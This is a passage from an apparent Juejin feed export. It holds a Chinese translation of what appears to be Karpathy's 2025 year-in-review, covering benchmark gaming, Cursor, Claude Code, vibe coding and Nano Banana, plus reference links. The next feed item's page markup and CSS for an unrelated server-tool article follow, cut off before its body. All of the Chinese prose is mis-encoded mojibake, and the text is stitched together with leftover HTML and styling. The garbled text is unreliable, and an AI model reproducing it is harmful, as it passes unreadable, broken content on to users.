<p>ä¸ä¸Šè¿°ç°è±¡å¯†åˆ‡ç›¸å…³çš„æ˜¯ï¼Œæˆ‘åœ¨ 2025 å¹´å¯¹å„ç±»åŸºå‡†æµ‹è¯•ï¼ˆbenchmarksï¼‰æ™®éæ„Ÿåˆ°å†·æ¼ ï¼Œå¹¶ä¸”ä¸å†ä¿¡ä»»å®ƒä»¬ã€‚æ ¸å¿ƒé—®é¢˜åœ¨äºï¼ŒåŸºå‡†æµ‹è¯•ï¼ˆbenchmarksï¼‰åœ¨è®¾è®¡ä¸Šå‡ ä¹å¤©ç„¶å°±æ˜¯å¯éªŒè¯çš„ç¯å¢ƒï¼Œå› æ­¤å¾ˆå®¹æ˜“è¢« RLVRï¼ˆä»¥åŠé€šè¿‡åˆæˆæ•°æ®ç”Ÿæˆçš„è¾ƒå¼±å½¢å¼ï¼‰è¿›è¡Œé’ˆå¯¹æ€§ä¼˜åŒ–ã€‚ç°åœ¨çš„ LLM å›¢é˜Ÿä¸ºäº†åˆ·é«˜ benchmark åˆ†æ•°ï¼Œä¼šå›´ç»•é‚£äº›æµ‹è¯•é¢˜åœ¨æ¨¡å‹â€œç†è§£ç©ºé—´â€é‡Œçš„ä½ç½®ï¼Œå¤§é‡ç”Ÿæˆç±»ä¼¼é¢˜ç›®æ¥è®­ç»ƒæ¨¡å‹ï¼Œè®©å®ƒåªåœ¨è¿™äº›ç‚¹ä¸Šå˜å¾—è¶…å¼ºï¼Œåˆ«çš„åœ°æ–¹å…ˆä¸ç®¡ã€‚ç»“æœå°±æ˜¯æ¨¡å‹èƒ½åŠ›åƒé”¯é½¿ä¸€æ · â€”â€” æ¦œå•ä¸Šåˆ†æ•°çˆ†è¡¨ï¼Œå®é™…ç”¨èµ·æ¥æ¼æ´ç™¾å‡ºã€‚è€Œâ€œå˜ç›¸åœ¨æµ‹è¯•é›†ä¸Šè®­ç»ƒâ€è¿™ä»¶äº‹ï¼Œå·²ç»ç©å‡ºäº†èŠ±ï¼Œæˆäº†è¡Œä¸šæ½œè§„åˆ™ã€‚</p>
<p>å¦‚æœåœ¨ç¢¾å‹æ‰€æœ‰åŸºå‡†æµ‹è¯•ï¼ˆbenchmarkï¼‰çš„åŒæ—¶ï¼Œå´ä»æœªå®ç°é€šç”¨äººå·¥æ™ºèƒ½ï¼ˆAGIï¼‰ï¼Œé‚£å°†ä¼šæ˜¯ä¸€ç§ä»€ä¹ˆæ™¯è±¡ï¼Ÿ</p>
<h2 data-id="heading-2"><strong>03 Cursor / æ–°çš„ LLM åº”ç”¨å±‚</strong></h2>
<p>å…³äº Cursorï¼ˆé™¤äº†å®ƒä»Šå¹´ä»¥ç«ç®­èˆ¬çš„é€Ÿåº¦å´›èµ·ä¹‹å¤–ï¼‰ï¼Œæˆ‘è§‰å¾—æœ€å€¼å¾—æ³¨æ„çš„æ˜¯ï¼šCursor ä¸ä»…è‡ªå·±æˆåŠŸäº†ï¼Œæ›´é‡è¦çš„æ˜¯å®ƒå¼€åˆ›äº†ä¸€ç§æ–°æ¨¡å¼ï¼Œå¤§å®¶çªç„¶æ„è¯†åˆ°ï¼šâ€œå“¦ï¼ŒåŸæ¥ LLM åº”ç”¨å¯ä»¥è¿™æ ·åšï¼â€äºæ˜¯å¼€å§‹è®¾æƒ³å„è¡Œå„ä¸šçš„â€œCursorâ€ã€‚æ­£å¦‚æˆ‘ä»Šå¹´åœ¨ Y Combinator æ¼”è®²ä¸­æ‰€å¼ºè°ƒçš„ï¼ˆé™„æœ‰æ–‡å­—ç¨¿[1]å’Œè§†é¢‘[2]ï¼‰ï¼Œåƒ Cursor è¿™æ ·çš„ LLM åº”ç”¨ï¼Œä¼šä¸ºç‰¹å®šå‚ç›´é¢†åŸŸï¼ˆå¦‚ç¼–ç¨‹ã€æ³•å¾‹ã€è®¾è®¡ç­‰ï¼‰å°†å¤šæ¬¡ LLM è°ƒç”¨æ‰“åŒ…å¹¶ç¼–æ’æˆä¸€ä¸ªæ•´ä½“å·¥ä½œæµï¼š</p>
<ul>
<li>å®ƒä»¬è´Ÿè´£ <strong>â€œä¸Šä¸‹æ–‡å·¥ç¨‹â€ï¼ˆcontext engineeringï¼‰</strong></li>
<li>å®ƒä»¬<strong>åœ¨åå°å°†å¤šæ¬¡ LLM è°ƒç”¨ç¼–æ’æˆæ—¥ç›Šå¤æ‚çš„ DAGï¼ˆæœ‰å‘æ— ç¯å›¾ï¼‰</strong> ï¼Œå¹¶åœ¨æ­¤è¿‡ç¨‹ä¸­ç²¾ç»†æƒè¡¡æ€§èƒ½ä¸è®¡ç®—æˆæœ¬</li>
<li>å®ƒä»¬ä¸ºâ€œhuman-in-the-loopâ€ä¸­æä¾›<strong>é¢å‘ç‰¹å®šåº”ç”¨åœºæ™¯çš„å›¾å½¢ç•Œé¢ï¼ˆGUIï¼‰</strong></li>
<li>å®ƒä»¬æä¾›ä¸€ä¸ª <strong>â€œè‡ªä¸»æ€§æ»‘å—â€ï¼ˆautonomy sliderï¼‰</strong> Â â€”â€” å…è®¸ç”¨æˆ·åŠ¨æ€è°ƒèŠ‚ AI çš„å†³ç­–è‡ªç”±åº¦</li>
</ul>
<p>2025 å¹´ï¼Œä¸šç•Œå¤§é‡è®¨è®ºéƒ½å›´ç»•ç€è¿™ä¸ªæ–°å‡ºç°çš„åº”ç”¨å±‚çš„â€œåšåº¦â€ï¼ŒLLM å®éªŒå®¤ï¼ˆå¦‚ OpenAIã€Anthropic ç­‰ï¼‰ä¼šåƒæ‰æ‰€æœ‰ä¸Šå±‚åº”ç”¨ï¼Œè¿˜æ˜¯è¯´ LLM åº”ç”¨é¢†åŸŸä»æ˜¯å¹¿é˜”å¤©åœ°ï¼Œå¤§æœ‰ä½œä¸ºï¼Ÿæˆ‘ä¸ªäººè®¤ä¸ºï¼ŒLLM å®éªŒå®¤ä¼šå€¾å‘äºåŸ¹å…»å‡ºä¸€ä¸ªâ€œé€šæ‰å‹çš„å¤§å­¦ç”Ÿâ€ï¼Œè€Œ LLM åº”ç”¨åˆ™ä¼šé€šè¿‡æ³¨å…¥ç§æœ‰æ•°æ®ã€ä¼ æ„Ÿå™¨ã€æ‰§è¡Œå™¨å’Œåé¦ˆå›è·¯ï¼Œå¯¹è¿™äº›â€œå¤§å­¦ç”Ÿâ€è¿›è¡Œç»„ç»‡ã€å¾®è°ƒï¼Œå¹¶çœŸæ­£æ¿€æ´»æˆéƒ¨ç½²åœ¨å…·ä½“å‚ç›´é¢†åŸŸçš„â€œä¸“ä¸šä»ä¸šè€…â€ã€‚</p>
<h2 data-id="heading-3"><strong>04 Claude Code / é©»å®ˆåœ¨æˆ‘ä»¬è®¡ç®—æœºçš„ AI</strong></h2>
<p>Claude Codeï¼ˆCCï¼‰æˆä¸ºé¦–ä¸ªä»¤å¤§å®¶ä¿¡æœçš„ LLM æ™ºèƒ½ä½“ï¼ˆAgentï¼‰èŒƒä¾‹ â€”â€” å®ƒä»¥å¾ªç¯è¿­ä»£æ–¹å¼å°†å·¥å…·ä½¿ç”¨ä¸æ¨ç†ä¸²è”èµ·æ¥ï¼Œç”¨äºè§£å†³éœ€è¦é•¿æ—¶é—´ã€å¤šæ­¥éª¤çš„å¤æ‚é—®é¢˜ã€‚æ­¤å¤–ï¼Œå¯¹æˆ‘è€Œè¨€ï¼ŒCC çš„å¦ä¸€ä¸ªç‰¹ç‚¹æ˜¯ï¼šå®ƒè¿è¡Œåœ¨æˆ‘ä»¬çš„æœ¬åœ°è®¡ç®—æœºä¸Šï¼Œå¹¶ç›´æ¥åˆ©ç”¨æˆ‘ä»¬æœ¬åœ°çš„ç§æœ‰ç¯å¢ƒã€æ•°æ®å’Œä¸Šä¸‹æ–‡ã€‚æˆ‘è®¤ä¸º OpenAI åœ¨è¿™ä¸€ç‚¹ä¸Šåˆ¤æ–­æœ‰è¯¯ï¼Œå› ä¸ºä»–ä»¬æ—©æœŸåœ¨ Codex / æ™ºèƒ½ä½“ï¼ˆagentï¼‰æ–¹é¢çš„å°è¯•ï¼Œèšç„¦äºé€šè¿‡ ChatGPT ç¼–æ’äº‘ç«¯å®¹å™¨ä¸­çš„æ™ºèƒ½ä½“ï¼Œè€Œä¸æ˜¯ç›´æ¥åœ¨ç”¨æˆ·çš„æœ¬åœ°æœºå™¨ï¼ˆlocalhostï¼‰ä¸Šè¿è¡Œã€‚å°½ç®¡äº‘ç«¯è¿è¡Œçš„æ™ºèƒ½ä½“é›†ç¾¤ï¼ˆagent swarmsï¼‰å¬èµ·æ¥åƒæ˜¯â€œAGI çš„æœ€ç»ˆå½¢æ€ï¼Œä½†æˆ‘ä»¬æ­£å¤„åœ¨ä¸€ä¸ªèƒ½åŠ›â€œé”¯é½¿çŠ¶â€ã€æ¼”è¿›ç¼“æ…¢çš„ä¸­é—´é˜¶æ®µï¼Œåœ¨è¿™ç§èƒŒæ™¯ä¸‹ï¼Œè®©æ™ºèƒ½ä½“ç›´æ¥è¿è¡Œåœ¨å¼€å‘è€…æœ¬æœºä¸Šåè€Œæ›´åˆç†ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>çœŸæ­£å…³é”®çš„åŒºåˆ«å¹¶ä¸åœ¨äºâ€œAI è¿ç®—â€ï¼ˆAI opsï¼‰åˆ°åº•è·‘åœ¨å“ªå„¿ï¼ˆäº‘ç«¯ã€æœ¬åœ°ï¼Œæˆ–å…¶ä»–åœ°æ–¹ï¼‰ï¼Œè€Œåœ¨äºå…¶ä»–å› ç´  â€”â€” é‚£å°å·²ç»å¼€æœºå¹¶è¿è¡Œç€çš„ç”µè„‘ï¼Œä»¥åŠå®ƒä¸Šé¢å·²å®‰è£…çš„è½¯ä»¶ã€å½“å‰ä¸Šä¸‹æ–‡ã€æ•°æ®ã€å¯†é’¥ã€é…ç½®ï¼Œè¿˜æœ‰ä½å»¶è¿Ÿçš„äº¤äº’ä½“éªŒã€‚</strong></p>
<p>Anthropic æ­£ç¡®æŠŠæ¡äº†è¿™ä¸€ä¼˜å…ˆçº§ï¼Œå¹¶å°† Claude Codeï¼ˆCCï¼‰æ‰“é€ æˆä¸€ä¸ªç²¾å·§çš„ã€æç®€çš„å‘½ä»¤è¡Œï¼ˆCLIï¼‰å½¢æ€ï¼Œè¿™ç§å½¢æ€å½»åº•æ”¹å˜äº†äººä»¬å¯¹ AI çš„è®¤çŸ¥ï¼šå®ƒä¸å†åªæ˜¯ä¸€ä¸ªåƒ Google é‚£æ ·éœ€è¦ä½ ä¸»åŠ¨æ‰“å¼€æµè§ˆå™¨å»è®¿é—®çš„ç½‘ç«™ï¼Œè€Œæ›´åƒæ˜¯ä¸€ä¸ªâ€œå¯„å±…â€åœ¨ä½ ç”µè„‘é‡Œçš„å°ç²¾çµï¼ˆæˆ–å¹½çµï¼‰ã€‚è¿™æ˜¯ä¸€ç§ä¸ AI äº¤äº’çš„å…¨æ–°ä¸”æˆªç„¶ä¸åŒçš„èŒƒå¼ã€‚</p>
<h2 data-id="heading-4"><strong>05 Vibe coding</strong></h2>
<p>2025 å¹´ï¼ŒAI çš„èƒ½åŠ›è¾¾åˆ°äº†ä¸€ä¸ªè´¨å˜çš„ä¸´ç•Œç‚¹ï¼šäººä»¬ç°åœ¨èƒ½ä»…é€šè¿‡è‡ªç„¶è¯­è¨€å°±æ„å»ºå‡ºå„ç§ä»¤äººä¸ºä¹‹æƒŠå¹çš„ç¨‹åºï¼Œç”šè‡³å®Œå…¨ä¸ç”¨å»æƒ³â€œä»£ç â€æœ¬èº«çš„å­˜åœ¨ã€‚è¯´æ¥å¥½ç¬‘ï¼Œæˆ‘æ˜¯åœ¨ä¸€æ¡æ€ç»ªå¦‚æ³‰æ¶Œçš„æ¨æ–‡[3]ä¸­éšå£åˆ›é€ äº† â€œvibe codingâ€ï¼ˆæ°›å›´ç¼–ç¨‹ï¼‰è¿™ä¸ªè¯ï¼Œå½“æ—¶æ ¹æœ¬æ²¡æƒ³åˆ°å®ƒå±…ç„¶ç«äº† :)ã€‚é€šè¿‡ vibe codingï¼Œç¼–ç¨‹å°±ä¸å†æ˜¯ç»è¿‡å¤§é‡è®­ç»ƒçš„ä¸“ä¸šäººå£«çš„ä¸“å±é¢†åŸŸï¼Œè€Œæ˜¯ä»»ä½•äººéƒ½èƒ½ä¸Šæ‰‹çš„äº‹æƒ…ã€‚ä»è¿™ä¸ªè§’åº¦çœ‹ï¼Œå®ƒå†æ¬¡å°è¯äº†æˆ‘åœ¨ã€ŠPower to the people: How LLMs flip the script on technology diffusionã€‹[4]ä¸­å†™åˆ°çš„è§‚ç‚¹ï¼šä¸è¿„ä»Šä¸ºæ­¢å‡ ä¹æ‰€æœ‰å…¶ä»–æŠ€æœ¯éƒ½ä¸åŒï¼Œæ™®é€šå¤§ä¼—ä» LLM ä¸­çš„è·ç›Šè¿œå¤§äºä¸“ä¸šäººå£«ã€ä¼ä¸šå’Œæ”¿åºœã€‚</p>
<p>ä½† vibe coding çš„æ„ä¹‰ä¸ä»…åœ¨äºå¸®åŠ©æ™®é€šäººæ¥è§¦ç¼–ç¨‹ â€”â€” å®ƒä¹Ÿè®©å—è¿‡ä¸“ä¸šè®­ç»ƒçš„å¼€å‘è€…èƒ½å¤Ÿå†™å‡ºå¤§é‡åŸæœ¬æ ¹æœ¬ä¸ä¼šè¢«å®ç°çš„ï¼ˆvibe codedï¼‰è½¯ä»¶ã€‚</p>
<p>åœ¨ nanochat ä¸­ï¼Œæˆ‘ç”¨ vibe coding è‡ªå·±å†™äº†ä¸€ä¸ªé«˜åº¦å®šåˆ¶çš„ã€é«˜æ•ˆçš„ Rust ç‰ˆ BPE tokenizerï¼Œä¸”æ— éœ€ä¾èµ–ç°æˆçš„åº“ï¼Œä¹Ÿæ— éœ€æ·±å…¥å­¦ä¹  Rustã€‚ä»Šå¹´æˆ‘ç”¨ vibe coding å¿«é€Ÿåšå‡ºäº†è®¸å¤šå°åº”ç”¨åŸå‹ï¼Œåªä¸ºå®ç°æˆ‘è„‘ä¸­é‚£äº›ä¸€é—ªè€Œè¿‡çš„æƒ³æ³•ï¼ˆä¾‹å¦‚ï¼šmenugen[5]ã€llm-council[6]ã€reader3[7]ã€HN time capsule[8]ï¼‰ã€‚æˆ‘ç”šè‡³ç”¨ vibe coding å†™è¿‡ä¸€æ•´ä¸ªä¸´æ—¶åº”ç”¨ï¼Œåªä¸ºå®šä½ä¸€ä¸ª bug â€”â€” ä¸ºä»€ä¹ˆä¸å‘¢ï¼Ÿæ¯•ç«Ÿä»£ç çªç„¶å˜å¾—æˆæœ¬æä½ï¼ˆfreeï¼‰ã€çŸ­æš‚ï¼ˆephemeralï¼‰ã€å¯å¡‘ï¼ˆmalleableï¼‰ã€ç”¨å®Œå³å¯ä¸¢å¼ƒï¼ˆdiscardable after single useï¼‰ã€‚Vibe coding å°†é‡å¡‘è½¯ä»¶ç”Ÿæ€ï¼Œå¹¶å½»åº•æ”¹å˜å¼€å‘ç›¸å…³å²—ä½çš„èŒè´£æè¿°ã€‚</p>
<h2 data-id="heading-5"><strong>06 Nano banana / LLM GUI</strong></h2>
<p>Google Gemini Nano banana æ˜¯ 2025 å¹´æœ€å…·é¢ è¦†æ€§ã€æœ€èƒ½æ¨åŠ¨èŒƒå¼å˜é©çš„æ¨¡å‹ä¹‹ä¸€ã€‚åœ¨æˆ‘çš„ä¸–ç•Œè§‚ä¸­ï¼Œå¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMsï¼‰æ˜¯ç»§ 1970ã€80 å¹´ä»£è®¡ç®—æœºä¹‹åçš„ä¸‹ä¸€ä¸ªé‡å¤§è®¡ç®—èŒƒå¼ã€‚å› æ­¤ï¼Œå‡ºäºæœ¬è´¨ä¸Šç›¸ä¼¼çš„åŸå› ï¼Œæˆ‘ä»¬å°†ä¼šè§è¯ç±»ä¼¼ç±»å‹çš„åˆ›æ–°ã€‚æˆ‘ä»¬å°†çœ‹åˆ°ç±»ä¼¼äºâ€œä¸ªäººè®¡ç®—â€ã€â€œå¾®æ§åˆ¶å™¨â€ï¼ˆè®¤çŸ¥æ ¸å¿ƒï¼‰æˆ–â€œäº’è”ç½‘â€ï¼ˆæ™ºèƒ½ä½“ç½‘ç»œï¼‰ç­‰äº‹ç‰©åœ¨ AI æ—¶ä»£çš„å¯¹åº”å½¢æ€ã€‚</p>
<p>å°¤å…¶æ˜¯åœ¨ UI/UX æ–¹é¢ï¼Œâ€œä¸ LLM å¯¹è¯â€æœ‰ç‚¹åƒåœ¨ 1980 å¹´ä»£å‘è®¡ç®—æœºç»ˆç«¯è¾“å…¥å‘½ä»¤ã€‚æ–‡æœ¬æ˜¯è®¡ç®—æœºï¼ˆä»¥åŠ LLMï¼‰çš„åŸå§‹/é¦–é€‰æ•°æ®è¡¨ç¤ºå½¢å¼ï¼Œå´å¹¶éäººç±»åå¥½çš„äº¤äº’æ ¼å¼ â€”â€” å°¤å…¶æ˜¯åœ¨è¾“å…¥ç«¯ã€‚äº‹å®ä¸Šï¼Œäººä»¬å¹¶ä¸å–œæ¬¢é˜…è¯»å¤§æ®µæ–‡å­—ï¼Œå› ä¸ºè¿™æ—¢æ…¢åˆè´¹åŠ›ã€‚ç›¸åï¼Œäººä»¬æ›´å€¾å‘äºä»¥è§†è§‰åŒ–ã€ç©ºé—´åŒ–çš„æ–¹å¼æ¥æ”¶ä¿¡æ¯ï¼Œè¿™æ­£æ˜¯ä¼ ç»Ÿè®¡ç®—ï¼ˆtraditional computingï¼‰ä¸­å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆGUIï¼‰è¢«å‘æ˜çš„åŸå› ã€‚</p>
<p>åŒç†ï¼Œ<strong>LLM ä¹Ÿåº”è¯¥ç”¨æˆ‘ä»¬åå¥½çš„æ ¼å¼ä¸æˆ‘ä»¬å¯¹è¯ â€”â€” æ¯”å¦‚ï¼šå›¾ç‰‡ã€ä¿¡æ¯å›¾ã€å¹»ç¯ç‰‡ã€ç™½æ¿ã€åŠ¨ç”»/è§†é¢‘ã€ç½‘é¡µåº”ç”¨ç­‰ã€‚</strong></p>
<p>å½“ç„¶ï¼Œè¿™ç§ç†å¿µçš„æ—©æœŸå½¢æ€å’Œå½“å‰ç‰ˆæœ¬ï¼Œæ˜¯åƒ emoji å’Œ Markdown è¿™æ ·çš„ä¸œè¥¿ â€”â€” å®ƒä»¬æœ¬è´¨ä¸Šæ˜¯é€šè¿‡æ ‡é¢˜ã€åŠ ç²—ã€æ–œä½“ã€åˆ—è¡¨ã€è¡¨æ ¼ç­‰æ–¹å¼å¯¹æ–‡æœ¬è¿›è¡Œâ€œè§†è§‰è£…é¥°â€å’Œæ’ç‰ˆï¼Œæ¥æå‡å¯è¯»æ€§ã€‚</p>
<p>ä½†ç©¶ç«Ÿè°ä¼šçœŸæ­£æ„å»ºå‡º LLM çš„ GUIï¼ˆå›¾å½¢ç”¨æˆ·ç•Œé¢ï¼‰ï¼Ÿ</p>
<p>åœ¨è¿™ä¸€ä¸–ç•Œè§‚ä¸‹ï¼ŒNano banana æ˜¯å¯¹æ­¤æœªæ¥å½¢æ€çš„ä¸€æ¬¡æ—©æœŸé¢„ç¤ºã€‚æ›´é‡è¦çš„æ˜¯ï¼ŒNano Banana çš„æ„ä¹‰ï¼Œä¸åœ¨äºå®ƒèƒ½è¿›è¡Œå›¾åƒç”Ÿæˆï¼Œè€Œåœ¨äºæ–‡æœ¬ç”Ÿæˆã€å›¾åƒç”Ÿæˆä¸ä¸–ç•ŒçŸ¥è¯†åœ¨æ¨¡å‹æƒé‡ä¸­æ·±åº¦èåˆæ‰€äº§ç”Ÿçš„è”åˆèƒ½åŠ›ã€‚</p>
<p><strong>END</strong></p>
<p><strong>æœ¬æœŸäº’åŠ¨å†…å®¹ ğŸ»</strong></p>
<p><strong>â“å¦‚æœåƒ Nano Banana é¢„ç¤ºçš„é‚£æ ·ï¼Œæœªæ¥çš„ AI ä¸å†åªç”¨æ–‡å­—å›å¤ä½ ï¼Œè€Œæ˜¯è‡ªåŠ¨ç”Ÿæˆå›¾è¡¨ã€æµç¨‹å›¾ã€ç”šè‡³äº¤äº’ç•Œé¢ â€”â€” ä½ æœ€å¸Œæœ›å®ƒåœ¨å“ªç§åœºæ™¯ä¸‹ä»¥â€œéæ–‡å­—â€çš„æ–¹å¼ä¸ä½ åä½œï¼Ÿ</strong></p>
<p><strong>æ–‡ä¸­é“¾æ¥</strong></p>
<p>[1]<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.donnamagi.com%2Farticles%2Fkarpathy-yc-talk" target="_blank" title="https://www.donnamagi.com/articles/karpathy-yc-talk" ref="nofollow noopener noreferrer">www.donnamagi.com/articles/kaâ€¦</a></p>
<p>[2]<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DLCEmiRjPEtQ" target="_blank" title="https://www.youtube.com/watch?v=LCEmiRjPEtQ" ref="nofollow noopener noreferrer">www.youtube.com/watch?v=LCEâ€¦</a></p>
<p>[3]<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fkarpathy%2Fstatus%2F1886192184808149383" target="_blank" title="https://x.com/karpathy/status/1886192184808149383" ref="nofollow noopener noreferrer">x.com/karpathy/stâ€¦</a></p>
<p>[4]<a href="https://link.juejin.cn?target=https%3A%2F%2Fkarpathy.bearblog.dev%2Fpower-to-the-people%2F" target="_blank" title="https://karpathy.bearblog.dev/power-to-the-people/" ref="nofollow noopener noreferrer">karpathy.bearblog.dev/power-to-thâ€¦</a></p>
<p>[5]<a href="https://link.juejin.cn?target=https%3A%2F%2Fkarpathy.bearblog.dev%2Fvibe-coding-menugen" target="_blank" title="https://karpathy.bearblog.dev/vibe-coding-menugen" ref="nofollow noopener noreferrer">karpathy.bearblog.dev/vibe-codingâ€¦</a></p>
<p>[6]<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkarpathy%2Fllm-council" target="_blank" title="https://github.com/karpathy/llm-council" ref="nofollow noopener noreferrer">github.com/karpathy/llâ€¦</a></p>
<p>[7]<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkarpathy%2Freader3" target="_blank" title="https://github.com/karpathy/reader3" ref="nofollow noopener noreferrer">github.com/karpathy/reâ€¦</a></p>
<p>[8]<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkarpathy%2Fhn-time-capsule" target="_blank" title="https://github.com/karpathy/hn-time-capsule" ref="nofollow noopener noreferrer">github.com/karpathy/hnâ€¦</a></p>
<p><strong>åŸæ–‡é“¾æ¥ï¼š</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fkarpathy.bearblog.dev%2Fyear-in-review-2025%2F" target="_blank" title="https://karpathy.bearblog.dev/year-in-review-2025/" ref="nofollow noopener noreferrer">karpathy.bearblog.dev/year-in-revâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è¿ç»´å¿…å¤‡ï¼ä¸€æ¬¾å…¨å¹³å°å¯ç”¨çš„æœåŠ¡å™¨ç®¡ç†åˆ©å™¨ï¼]]></title>    <link>https://juejin.cn/post/7592815497848750143</link>    <guid>https://juejin.cn/post/7592815497848750143</guid>    <pubDate>2026-01-09T01:19:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592815497848750143" data-draft-id="7589171972447027242" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è¿ç»´å¿…å¤‡ï¼ä¸€æ¬¾å…¨å¹³å°å¯ç”¨çš„æœåŠ¡å™¨ç®¡ç†åˆ©å™¨ï¼"/> <meta itemprop="keywords" content="React.js,Linux,Docker"/> <meta itemprop="datePublished" content="2026-01-09T01:19:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Javaé™ˆåºå‘˜"/> <meta itemprop="url" content="https://juejin.cn/user/3958702402176765"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è¿ç»´å¿…å¤‡ï¼ä¸€æ¬¾å…¨å¹³å°å¯ç”¨çš„æœåŠ¡å™¨ç®¡ç†åˆ©å™¨ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3958702402176765/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Javaé™ˆåºå‘˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T01:19:45.000Z" title="Fri Jan 09 2026 01:19:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" 